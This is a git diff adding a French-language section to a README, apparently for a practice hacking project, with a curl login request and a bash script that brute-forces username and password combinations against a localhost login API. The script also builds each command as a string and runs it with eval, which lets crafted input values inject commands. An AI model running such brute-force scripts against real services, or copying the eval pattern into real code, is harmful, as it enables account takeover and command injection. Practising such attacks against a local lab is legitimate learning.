@@ -37,6 +37,53 @@ node loadAccount.js
 npm run hack
 ```
 
+## cURL
+
+Voilà le script cURL pour tester le hack :
+
+```sh
+curl -X POST http://localhost:3000/api/login -H "Content-Type: application/json" -d '{"username":"admin", "password":"password"}'
+```
+
+Le truc, c'est qu'il faut tester toutes les combinaisons possibles. Pour cela, il faut utiliser un script qui va tester toutes les combinaisons possibles.
+
+## Script
+
+```sh
+#!/bin/bash
+
+url="http://localhost:3000/api/login"
+credentials_file="combinations.json"
+
+usernames=$(jq -r '.usernames[]' "$credentials_file")
+passwords=$(jq -r '.passwords[]' "$credentials_file")
+
+# Générer les commandes curl pour chaque combinaison
+for username in $usernames; do
+  for password in $passwords; do
+    command="curl -X POST $url -H \"Content-Type: application/json\" -d '{\"username\":\"$username\", \"password\":\"$password\"}'"
+    echo "Commande: $command"
+    response=$(eval $command)
+    echo "Réponse: $response"
+    echo "---"
+  done
+done
+```
+
+Je l'ai mis dans un fichier brute-force.sh, mais il faut le rendre exécutable pour pouvoir l'utiliser.
+
+Pour pouvoir utiliser le script, il faut le rendre exécutable :
+
+```sh
+chmod +x brute-force.sh
+```
+
+Et ensuite, il suffit de lancer le script :
+
+```sh
+./brute-force.sh
+```
+
 ## Author
 
 👤 **Anthony Gorski**
